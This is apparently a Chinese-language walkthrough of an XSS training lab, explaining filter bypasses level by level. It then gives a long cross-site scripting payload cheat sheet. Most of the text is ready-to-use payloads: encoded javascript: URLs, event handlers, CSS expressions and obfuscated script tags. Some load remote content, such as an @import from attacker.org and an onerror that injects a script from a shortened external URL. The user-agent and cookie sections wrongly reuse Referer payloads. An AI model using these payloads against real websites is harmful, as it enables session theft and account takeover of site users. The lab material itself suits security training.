+![截屏2021-06-15 下午5.22.00.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623749029746-69f2cd79-afd5-4730-84ec-3fc6d82c1521.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%885.22.00.png&originHeight=1662&originWidth=2604&size=647462&status=done&style=none&width=2604)<br />与上一关没有多大的区别，将单引号闭合换成双引号闭合就好<br />输入<br />**" onfocus=alert(1) autofocus="**<br />或者<br />**" onclick=alert(1) //**<br />后台源码<br />![截屏2021-06-15 下午5.28.31.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623749323867-3e6c9986-0474-4607-8952-f4b201c4109f.png#align=left&display=inline&height=1410&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%885.28.31.png&originHeight=1410&originWidth=1924&size=320546&status=done&style=none&width=1924)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623749358321-5ba27b7a-5a5a-44d9-aeec-0f344b76be36.png#align=left&display=inline&height=968&margin=%5Bobject%20Object%5D&name=image.png&originHeight=968&originWidth=1396&size=173433&status=done&style=none&width=1396)<br />所以要在没有符号“<>”的情况下，并且语句不被htmlspecialchars()函数影响的情况下构建payload
+## 构造伪协议
+![截屏2021-06-15 下午5.32.42.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623749618551-b23791dc-1f95-4559-a667-29a98cffcfec.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%885.32.42.png&originHeight=1662&originWidth=2604&size=621917&status=done&style=none&width=2604)<br />本关payload<br />**"><iframe src=javascript:alert(1)>**<br />**"><a href=javascript:alert(1)> **<br />**"> <a href="javascript:alert(1)">aaa</a>**<br />**"> <a href="javascript:%61lert(1)">aaa</a> //**<br />**"> <a href="javascript:alert()">aaa</a> <"**<br />后台源码<br />![截屏2021-06-15 下午5.36.49.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623749820552-fc9aa92f-99c1-4d70-b801-a05ded06a960.png#align=left&display=inline&height=1414&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%885.36.49.png&originHeight=1414&originWidth=1924&size=329699&status=done&style=none&width=1924)<br />分析代码发现，str_replace 就直接把<br />script 转换成 scr_ipt<br />on转换成 o_n<br />这样就过滤了js事件<br />且str_tolower函数使得大小写绕过失效<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623749904951-10d75be6-1a57-4205-b83a-37da6c310c68.png#align=left&display=inline&height=892&margin=%5Bobject%20Object%5D&name=image.png&originHeight=892&originWidth=1390&size=84726&status=done&style=none&width=1390)<br />所以本题需要构造伪协议
+## 大小写绕过
+![截屏2021-06-15 下午9.19.13.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623763182584-ead08137-c003-45f0-9e73-239dd99ed099.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.19.13.png&originHeight=1662&originWidth=2604&size=781054&status=done&style=none&width=2604)<br />本关使用大小写绕过<br />payload<br />**"> <Script>alert(1)</script> //**<br />**"> <img Src=x OnError=alert(1)> //**<br />**"><a HrEf="javascript:alert(1)">zhouzhong</a>//**<br />**" OncliCk=alert(1) //**<br />后台源码<br />![截屏2021-06-15 下午9.22.48.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623763380525-639c1c2d-61cd-4508-bdfd-6f91c86f68ce.png#align=left&display=inline&height=1446&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.22.48.png&originHeight=1446&originWidth=1616&size=341006&status=done&style=none&width=1616)<br />script 转换成 scr_ipt<br />on 转换成 o_n<br />src 转换成 sr_c<br />data 转换成 da_ta<br />href 转换成 hr_ef<br />然而唯独大小写绕过没有被禁止
+## 双写绕过
+![截屏2021-06-15 下午9.26.17.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623763627677-8ae16ef2-4d57-43ac-a4cb-3bc4a5057210.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.26.17.png&originHeight=1662&originWidth=2604&size=660289&status=done&style=none&width=2604)<br />双写绕过<br />payload<br />**"><sscriptcript>alert(1)</sscriptcript>**<br />**">hello<sscriptcript>alert(1)</sscriptcript>**<br />**" oonnmouseover=alert(1)**<br />**"><a hrhrefef=javascriscriptpt:alert(1)>zhouzhong</a>**<br />后台源码<br />![截屏2021-06-15 下午9.30.16.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623763831773-e003cc42-d531-41d3-812e-57c884084f67.png#align=left&display=inline&height=1446&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.30.16.png&originHeight=1446&originWidth=1920&size=347408&status=done&style=none&width=1920)<br />禁用大小写<br />且script，on，src ，data ，href 都直接转换成空<br />所以要使用双写绕过
+## HTML编码绕过
+![截屏2021-06-15 下午9.35.53.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623764165720-0591ae09-f3b9-470c-b4b4-7210c724138a.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.35.53.png&originHeight=1662&originWidth=2604&size=744802&status=done&style=none&width=2604)<br />使用HTML编码的方式构造payload：<br />**javascrip&#x74;:alert(1)**<br />**javasc&#x72;ipt:alert`1`**<br />**javasc&#x0072;ipt:alert`1`**<br />后台源码<br />![截屏2021-06-15 下午9.43.32.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623764625637-5667c189-5804-4788-828c-9a7c89bcfde6.png#align=left&display=inline&height=1448&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.43.32.png&originHeight=1448&originWidth=1194&size=324639&status=done&style=none&width=1194)<br />script 转换成 scr_ipt<br />on 转换成 o_n<br />src 转换成 sr_c<br />data 转换成 da_ta<br />href 转换成 hr_ef<br />大小写失效<br />" 被编码，但是尖括号<> ，单引号 ’ ,% ，# ，& 符号没有被过滤，输出点在a标签内，href属性中，<br />属性中双引号被转换成HTML实体，无法截断属性，我们可以使用协议绕过javascript:alert，由于script关键字被过滤，<br />javascript会被替换成javasc_rpt，我们使用&#x72等来代替r等字母即可 
+## 被检测是否为http链接
+![截屏2021-06-15 下午9.47.03.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623764917371-8f34c754-78dd-467a-90d4-e087c7b222a1.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.47.03.png&originHeight=1662&originWidth=2604&size=701432&status=done&style=none&width=2604)<br />与上个关卡类似，不同的是多了自己自动检测url<br />如果发现没有带http:// 内容则会显示不合法<br />payload<br />**javascrip&#x74;:alert(1)//http://xxx.com        //利用注释**<br />**javascrip&#x74;:%0dhttp://xxx.com%0dalert(1)      //不利用注释**<br />后台源码<br />![截屏2021-06-15 下午9.52.16.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623765147265-be907e10-a221-48d0-8d31-27dc441536ac.png#align=left&display=inline&height=1448&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%889.52.16.png&originHeight=1448&originWidth=1414&size=328407&status=done&style=none&width=1414)
+## 隐藏输入口
+![截屏2021-06-15 下午10.57.13.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623769053134-db43a13b-d700-4e9f-be41-0dfa46e5e16c.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8810.57.13.png&originHeight=1662&originWidth=2604&size=1182808&status=done&style=none&width=2604)<br />查看源码发现，本关卡存在三个隐藏的输入口，分别为 t_link、t_history、t_sort，将这三个get请求分别发送，查看哪个有用<br />![截屏2021-06-15 下午11.01.16.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623769295770-b076a25f-8cff-4dbf-804f-15d7b599e31e.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.01.16.png&originHeight=1662&originWidth=2604&size=1200090&status=done&style=none&width=2604)<br />可以看到只有t_sort处有用，所以我们在此进行注入<br />payload<br />**keyword = test&t_sort="type="text" onclick = "alert(1)**<br />**keyword = test&t_sort="type="text" onmouseover="alert(1)**<br />type="text"的作用是将后方hidden的作用去除<br />后台代码<br />![截屏2021-06-15 下午11.08.09.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623769701507-f14ce588-8e92-4482-8b93-03d16c1e8289.png#align=left&display=inline&height=1448&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.08.09.png&originHeight=1448&originWidth=1552&size=314653&status=done&style=none&width=1552)<br />分析代码，也发现需要两个参数，一个是keyword，一个是t_sort，尖括号<>都被转换成空，还有三个hidden的隐藏输入框
+## HTTP头部注入（referer）
+![截屏2021-06-15 下午11.12.11.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623769957998-45a1c281-a7ab-4650-8a3a-fb59543b3aae.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.12.11.png&originHeight=1662&originWidth=2604&size=746653&status=done&style=none&width=2604)<br />观察网页源码发现t_ref处的value可以进行注入，同时发现其value正是http-referer，使用burp抓包改包<br />![截屏2021-06-15 下午11.18.51.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623770345154-12df735b-5ed8-4f76-a2a4-49d34cc1a24e.png#align=left&display=inline&height=1750&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.18.51.png&originHeight=1750&originWidth=2696&size=545314&status=done&style=none&width=2696)<br />更改referer<br />payload<br />**Referer: " onmouseover=alert(1) type="text"**<br />**Referer: " onclick=alert(1) type="text"**<br />![截屏2021-06-15 下午11.28.45.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623770948841-bfa4338f-1349-4615-8ac5-942c48343f4a.png#align=left&display=inline&height=1750&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.28.45.png&originHeight=1750&originWidth=2696&size=694456&status=done&style=none&width=2696)<br />![截屏2021-06-15 下午11.28.51.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623770962946-b358220b-f654-49fb-b936-de76978629fe.png#align=left&display=inline&height=1666&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.28.51.png&originHeight=1666&originWidth=2536&size=636260&status=done&style=none&width=2536)<br />后台代码<br />![截屏2021-06-15 下午11.35.03.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623771314929-9e365fc1-f9a4-42c0-9455-09535e126898.png#align=left&display=inline&height=1448&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.35.03.png&originHeight=1448&originWidth=1924&size=332445&status=done&style=none&width=1924)<br />多了一个 str11=_SERVER[‘HTTP_REFERER’]; 所以考察的是http头部的xss注入，用burpsuite抓包，新增相应的字段，构造http头部Referer的payload
+## HTTP头部注入（user-agent）
+![截屏2021-06-15 下午11.32.44.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623771179342-bef346a1-c062-4e2c-9790-a1dd8fa7f62d.png#align=left&display=inline&height=1666&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.32.44.png&originHeight=1666&originWidth=2536&size=996503&status=done&style=none&width=2536)<br />同第11关一样，burp抓包后改user-agent<br />payload<br />**Referer: " onmouseover=alert(1) type="text"**<br />**Referer: " onclick=alert(1) type="text"**
+## HTTP头部注入（cookie）
+![截屏2021-06-15 下午11.38.06.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623771524348-f8bbb88a-a43f-4ceb-b210-120c53e0c5ed.png#align=left&display=inline&height=1666&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.38.06.png&originHeight=1666&originWidth=2536&size=901092&status=done&style=none&width=2536)<br />同11关一样，burp抓包后更改cookie<br />payload<br />**Referer: " onmouseover=alert(1) type="text"**<br />**Referer: " onclick=alert(1) type="text"**
+## Exif xss
+Exif即<br />**可交换图像文件格式**（英语：Exchangeable image file format，官方简称**Exif**），是专门为[数码相机](https://zh.wikipedia.org/wiki/%E6%95%B0%E7%A0%81%E7%9B%B8%E6%9C%BA)的照片设定的，可以记录数码照片的属性信息和拍摄数据。可使用鼠标右键进入属性页面查看部分信息。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623852389251-63b29dd3-983c-4b96-aa7f-7253d6f2fd41.png#align=left&display=inline&height=608&margin=%5Bobject%20Object%5D&name=image.png&originHeight=608&originWidth=413&size=27572&status=done&style=none&width=413)
+<p>使用工具（如exiftool）可以修改图片的信息数据<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623852519991-d32f775a-804d-43d4-a162-acaae9818014.png#align=left&amp;display=inline&amp;height=574&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=574&amp;originWidth=419&amp;size=33790&amp;status=done&amp;style=none&amp;width=419" alt="image.png" /><br />然后上传到可以读取Exif的网站上即可出现弹窗<br />有些谷歌浏览器安装了EXIF Vewer插件，而chrome Exif Viewer插件获取图片exif信息的时候没有过滤，导致了XSS代码的执行。</p>
+<h2 id="angular-jszhong-de-ng-include">angular js中的ng-include</h2>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623849212857-3d1b95b5-375a-4433-9fb9-7d39854461f0.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%889.13.15.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=1010834&amp;status=done&amp;style=none&amp;width=2604" alt="截屏2021-06-16 下午9.13.15.png" /><br />观察网页源码，发现“ng-include”字样<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623849597831-0f074ce1-af05-4147-adca-4547b588c0ee.png#align=left&amp;display=inline&amp;height=1354&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%889.19.43.png&amp;originHeight=1354&amp;originWidth=1696&amp;size=238306&amp;status=done&amp;style=none&amp;width=1696" alt="截屏2021-06-16 下午9.19.43.png" /><br />在第15关的URL后加上<br /><strong>?src='level1.php?name=<img src=1 onerror=alert()>'</strong><br />或者<br /><strong>?src='level2.php?keyword=&quot; οnclick=&quot;alert(1)'</strong><br />后台源码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623850344951-b01773bd-744e-4e08-9725-d28e1df40f96.png#align=left&amp;display=inline&amp;height=212&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%889.32.08.png&amp;originHeight=212&amp;originWidth=1478&amp;size=39774&amp;status=done&amp;style=none&amp;width=1478" alt="截屏2021-06-16 下午9.32.08.png" /></p>
+<h2 id="kong-ge-bian-hui-che-rao-guo">空格变回车绕过</h2>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623850972595-4a0320ea-4ec0-4c72-befa-6f513ca8609a.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%889.40.16.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=1048294&amp;status=done&amp;style=none&amp;width=2604" alt="截屏2021-06-16 下午9.40.16.png" /><br />禁止大小写绕过<br />script , / , (空格),等都被转换成&amp;nbsp<br />即用%0d，%0a等绕过：<br />0a------换行符号－－－－－－&quot;\n&quot;<br />0d------回车符号－－－－－－&quot;\r&quot;<br />payload<br /><strong>&lt;img%0asrc=1%0aonerror=alert(1)&gt;</strong><br /><strong>&lt;iframe%0asrc=x%0donmouseover=alert<code>1</code>&gt;</iframe></strong><br /><strong>&lt;svg%0aonload=alert<code>1</code>&gt;</svg></strong><br />后台源码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623851182421-a61df0f2-f17e-4915-ad62-33eca5c8b36a.png#align=left&amp;display=inline&amp;height=1256&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%889.46.03.png&amp;originHeight=1256&amp;originWidth=1222&amp;size=269348&amp;status=done&amp;style=none&amp;width=1222" alt="截屏2021-06-16 下午9.46.03.png" /><br />所以要利用html编码的空白字符<code>%0a</code>代替空格</p>
+<h2 id="ke-kong-bian-liang-rao-guo">可控变量绕过</h2>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623851781792-8308dae8-72ae-406e-b840-d6ae1858339b.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%889.54.27.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=537230&amp;status=done&amp;style=none&amp;width=2604" alt="截屏2021-06-16 下午9.54.27.png" /><br />观察网页源码，发现<br />&lt;embed src=xsf01.swf?a=b width=100% heigth=100%&gt;<h2 align=center>成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关</a></h2><br />传入的参数在下方输出到页面上<br />网页后台又对参数进行了实体编码转换，这里构造事件进行弹框<br />payload<br /><strong>level17.php?arg01=a&amp;arg02=1%20οnmοuseοver=alert(1)</strong><br />第18关与本关相同</p>
+<h1 id="xss-payloadda-quan">XSS payload大全</h1>
+<h2 id="di-yi-lei-javascript-url">第一类：Javascript URL</h2>
+<p><a href="javascript:alert('test')">link</a><br /><a href="java&#115;cript:alert('xss')">link</a><br /><a href='vbscript:MsgBox("XSS")'>link</a><br /><a href="vbscript:alert(1)">Hello</a><br /><a href="vbscript&#058;alert(1)">Hello</a><br /><a href=javascript:alert(&quot;XSS&quot;)>link</a><br />&lt;a href=<code>javascript:alert(&quot;RSnake says,'XSS'&quot;)</code>&gt;link</a><br /><a href=javascript:alert(String.fromCharCode(88,83,83))>link</a><br /><a href="javascript&colon;alert(1)">link</a><br /><a href="javaSCRIPT&colon;alert(1)">Hello</a><br /><a href="javasc&NewLine;ript&colon;alert(1)">link</a> <br /><a href="javas&Tab;cript:\u0061lert(1);">Hello</a><br /><a href="jav    ascript:alert('XSS')">link</a><br /><a href="jav&#x09;ascript:alert('XSS')">link</a><br /><a href="jav&#x0D;ascript:alert('XSS')">link</a><br /><a href=" &#14;  javascript:alert('XSS');">link</a><br /><a href="javascript:\u0061lert&#x28;1&#x29">Hello</a><br /><a href="javascript:confirm`1`">link</a><br /><a href="javascript:confirm(1)">link</a><br /><a href="j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)">1</a><br /><a href="javascript:%61%6c%65%72%74%28%31%29">link</a><br /><a href="javascript:\u0061\u006C\u0065\u0072\u0074(1)">link</a><br />&lt;a href=javascript:eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;2</a><br />&lt;a href=javascript:eval(&quot;alert('xss')&quot;)&gt;link</a>  <br /><a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>link</a><br /><a href=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>link</a><br /><a href=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>link</a><br /><a href="data:text/html;base64,amF2YXNjcmlwdDphbGVydCgxKQ==">test</a> <br /><a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>1</a><br />&lt;iframe/src=&quot;data:text/html;	base64
+,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;</p>
+<h2 id="di-er-lei-css-import">第二类：CSS import</h2>
+<style>@import url("http://attacker.org/malicious.css");</style><br /><style>@imp\ort url("http://attacker.org/malicious.css");</style><br /><STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE><br /><STYLE>@import'http://jb51.net/xss.css';</STYLE>
+<h2 id="di-san-lei-inline-style">第三类：Inline style</h2>
+<div style="color: expression(alert('XSS'))"><br /><div style=color:expression\(alert(1))></div> <br /><div style="color: '<'; color: expression(alert('XSS'))"><br /><div style=X:expression(alert(/xss/))><br /><div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))"><br /><div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))"><br /><div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029"><br /><STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS<br /><DIV STYLE="background-image: url(javascript:alert('XSS'))"><br /><STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A><br /><div style="z:exp/*anything*/res/*here*/sion(alert(1))"><br /><div style=xss:expr/*XSS*/ession(alert('XSS'))><br /></XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))><br /></XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.baidu.com")> <br /><img STYLE="background-image:url(javascript:alert('XSS'))"> //ie6  <br /><img STYLE="background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29"> <br /><A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+## 第四类：JavaScript 事件
+<div onclick="alert('xss')"><br /><div onmouseenter="alert('xss')"><br /><div onclick ="alert('xss')"><br /><BODY ONLOAD=alert('XSS')><br /><img src=1 onerror=alert(1)><br /><img/src='1'/onerror=alert(0)><br /><img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" /><br /><img src=1 alt=al lang=ert onerror=top[alt+lang](0)><br /><img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img><br /><img src=1 onmouseover=alert('xss') a1=1111> <br /><img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://t.cn/R5UpyOt';><br /><a href="#" onclick=alert('\170\163\163')>test</a><br /><a href="#" onclick="\u0061\u006C\u0065\u0072\u0074(1)">link</a><br /><a href="#" onclick="\u0061\u006C\u0065\u0072\u0074`a`">link</a><br /><a href="#" onclick="alert(&#039;xss&#039;)">link</a><br /><marquee onscroll=alert(1)> test</marquee><br /><div  style="width:100px;height:100px;overflow:scroll" onscroll="alert('a')">123456 <br/><br/><br/><br/><br/></div><br /><DIV onmousewheel="alert('a')" >123456</DIV><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br /><div style="background-color:red" onmouseenter="alert('a')">123456</div><br /><DIV onmouseleave="alert('1')">123456</DIV><br /><div contentEditable="true" style="background-color:red" onfocusin="alert('a')" >asdf</div><br /><div contentEditable="true" style="background-color:red" onfocusout="alert('bem')" >asdf</div><br /><marquee onstart="alert('a')" >asdf</marquee><br /><div style="background-color:red;" onbeforecopy="alert('a')" >asdf</div><br /><div style="background-color:red;" onbeforecut="alert('a')" >asdf</div><br /><div style="background-color:red;" contentEditable="true" onbeforeeditfocus="alert('a')" >asdf</div><br /><div style="background-color:red;" ="true" onbeforepaste="alert('a')" >asdf</div><br /><div style="background-color:red;" oncontextmenu="alert('a')" >asdf</div><br /><div style="background-color:red;" oncopy="alert('a')" >asdf</div><br /><div contentEditable="true" style="background-color:red;" oncut="alert('a')" >asdf</div><br /><div style="background-color:red;" ondrag="alert('1')" >asdf</div><br /><div style="background-color:red;" ondragend="alert('a')" >asdf</div><br /><div style="background-color:red;" ondragenter="alert('b')" >asdf</div><br /><div contentEditable="true" style="background-color:red;" ondragleave="alert('a')" >asdf</div><br /><div contentEditable="true" style="background-color:red;" ondragover="alert('b')" >asdf</div><br /><div contentEditable="true" style="background-color:red;" ondragstart="alert('a')" >asdf</div><br /><div contentEditable="true" style="background-color:red;" ondrop="alert('b')" >asdf</div> <div contentEditable="true" style="background-color:green;" ondrop="alert('bem')" >asdf</div><br /><div contentEditable="true" style="background-color:red;" onlosecapture="alert('b')">asdf</div><br /><div contentEditable="true" style="background-color:red;" onpaste="alert('a')" >asdf</div><br /><div contentEditable="true" style="background-color:red;" onselectstart="alert('a')" >asdf</div><br /><div contentEditable="true" style="background-color:red;" onhelp="alert('a')" >asdf</div><br /><div STYLE="background-color:red;behavior:url('#default#time2')" onEnd="alert('a')">asdf</div><br /><div STYLE="background-color:red;behavior:url('#default#time2')" onBegin="alert('a')">asdf</div><br /><div contentEditable="true" STYLE="background-color:red;" onactivate="alert('b')">asdf</div><br /><div contentEditable="true" STYLE="background-color:red;filter: Alpha(opacity=100, style=2);"onfilterchange="alert('b')">asdf</div><br /><div contentEditable="true" onbeforeactivate="alert('b')">asdf</div><br /><div contentEditable="true" onbeforedeactivate="alert('a')">asdf</div><br /><div contentEditable="true" ondeactivate="alert('bem')">asdf</div><br /><video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" /><br /><video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" /><br /><audio src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)"><br /><audio src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)"></audio><br /><body onscroll=alert(26)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br /><input type="hidden" accesskey="X" onclick="alert(/xss/)">
+## 第五类：Script 标签
+<script src="http://baidu.com"></script><br /><script>alert("XSS")</script><br /><scr<script>ipt>alert("XSS")</scr<script>ipt><br /><SCRIPT>a=/XSS/ alert(a.source)</SCRIPT><br /><script>alert(/1/.source)</script><br /><script>alert(1);</script><br /><script>prompt(1);</script><br /><script>confirm(1);</script><br /><script>alert(/88199/)</script><br /><script>alert(`a`)</script><br /><script>alert('a')</script><br /><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><br /><script>eval(alert(1))</script><br /><script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</script><br /><script>eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029")</script><br /><script>eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script><br /><script>setTimeout('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script><br /><script>setTimeout(alert(1),0)</script><br /><script>setTimeout`alert\x28\x27 xss \x27\x29`</script><br /><script>setInterval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script><br /><script src=data:text/javascript,alert(1)></script><br /><script src=&#100&#97&#116&#97:text/javascript,alert(1)></script><br /><script>\u0061\u006C\u0065\u0072\u0074(123)</script><br /><script>\u0061\u006C\u0065\u0072\u0074(1)</script><br /><script>\u0061\u006C\u0065\u0072\u0074`a`</script><br /><script>window['alert'](0)</script><br /><script>parent['alert'](1)</script><br /><script>self['alert'](2)</script><br /><script>top['alert'](3)</script><br /><!--[if]><script>alert(1)</script     --><br /><script>alert("xss");;;;;;;;;;;;;;;;;    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script><br /><script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script><br 